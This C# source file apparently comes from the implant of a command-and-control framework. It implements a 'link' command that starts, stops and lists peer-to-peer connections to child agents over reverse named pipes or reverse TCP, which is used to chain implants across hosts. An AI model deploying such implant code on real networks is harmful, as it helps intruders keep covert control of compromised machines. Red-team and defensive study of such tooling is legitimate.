using Agent.Commands.Services;
using Agent.Communication;
using Agent.Models;
using Shared;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class LinkCommand : ServiceCommand
    {
        public override CommandId Command => CommandId.Link;

        protected override void RegisterVerbs()
        {
            base.RegisterVerbs();
            this.Register(CommandVerbs.Start, this.Start);
            this.Register(CommandVerbs.Stop, this.Stop);
        }

        protected async Task Start(AgentTask task, AgentCommandContext context)
        {
            task.ThrowIfParameterMissing(ParameterId.Bind);
 
            string bind = task.GetParameter<string>(ParameterId.Bind);
            var connexion = ConnexionUrl.FromString(bind);

            if (!connexion.IsValid)
            {
                context.Error($"{connexion} not valid");
                return;
            }

            if (connexion.Protocol != ConnexionType.ReverseNamedPipe && connexion.Protocol != ConnexionType.ReverseTcp)
            {
                context.Error($"{connexion.Protocol} is not a valid link protocol");
                return;
            }

            //connexion.Protocol = ConnexionType.ReverseNamedPipe;

            bool started = false;
            var commModule = CommunicationFactory.CreateCommunicator(connexion) as P2PCommunicator;
            try
            {
                started = await context.Agent.AddChildCommModule(task.Id, commModule);
            }
            catch(TaskCanceledException)
            {
                started = false;
            }

            if(started)
                context.AppendResult("Link successfully established!");
            else
                context.Error("Unable to establish link!");
        }

        protected async Task Stop(AgentTask task, AgentCommandContext context)
        {
            task.ThrowIfParameterMissing(ParameterId.Bind);

            string bind = task.GetParameter<string>(ParameterId.Bind);
            var connexion = ConnexionUrl.FromString(bind);

            if (!connexion.IsValid)
            {
                context.Error($"{connexion} not valid");
                return;
            }

            if (connexion.Protocol != ConnexionType.ReverseNamedPipe && connexion.Protocol != ConnexionType.ReverseTcp)
            {
                context.Error($"{connexion.Protocol} is not a valid link protocol");
                return;
            }

            var commModule = context.Agent.ChildrenCommModules.Values.FirstOrDefault(c => c.Connexion.ToString().ToLower() == connexion.ToString().ToLower());
            if(commModule == null)
            {
                context.Error($"Unable to find link {connexion.ToString()}!");
                return;
            }

            await context.Agent.RemoveChildCommModule(commModule);

            context.AppendResult("Link successfully disconnected!");
        }

        protected override async Task Show(AgentTask task, AgentCommandContext context)
        {
            if (!context.Agent.ChildrenCommModules.Any())
            {
                context.AppendResult("No links connected!");
                return;
            }

            List<LinkInfo> links = new List<LinkInfo>();
            foreach(var childId in context.Agent.ChildrenCommModules.Keys)
            {
                var comm = context.Agent.ChildrenCommModules[childId];

                links.Add(new LinkInfo()
                {
                    ParentId = context.Agent.MetaData.Id,
                    ChildId = childId,
                    Binding = comm.Connexion.ToString(),
                });
            }

            context.Objects(links);
        }
    }
}
